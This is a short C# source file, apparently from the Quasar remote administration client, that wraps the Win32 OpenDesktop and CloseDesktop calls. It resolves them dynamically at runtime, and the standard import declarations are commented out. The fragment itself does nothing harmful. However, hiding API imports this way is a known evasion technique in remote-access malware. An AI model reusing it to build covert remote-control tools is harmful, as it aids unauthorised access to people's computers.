using Quasar.Client.Win32PE.PE;
using Quasar.Client.Win32PE.Structs;
using Quasar.Common.Models;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Client.Utilities
{
    /// <summary>
    /// Provides access to the Win32 API.
    /// </summary>
    internal static partial class ClientNatives
    {
        //[DllImport("user32.dll", CharSet = CharSet.Unicode)]
        internal delegate IntPtr OpenDesktopFunc([MarshalAs(UnmanagedType.LPWStr)] string hDesktop, int flags, bool inherit, uint desiredAccess);
        internal static IntPtr OpenDesktop([MarshalAs(UnmanagedType.LPWStr)] string hDesktop, int flags, bool inherit, uint desiredAccess) => Lookup<OpenDesktopFunc>("user32.dll", "OpenDesktopW")(hDesktop, flags, inherit, desiredAccess);

        //[DllImport("user32.dll")]
        internal delegate bool CloseDesktopFunc(IntPtr hDesktop);
        internal static bool CloseDesktop(IntPtr hDesktop) => Lookup<CloseDesktopFunc>("user32.dll", "CloseDesktop")(hDesktop);
    }
}
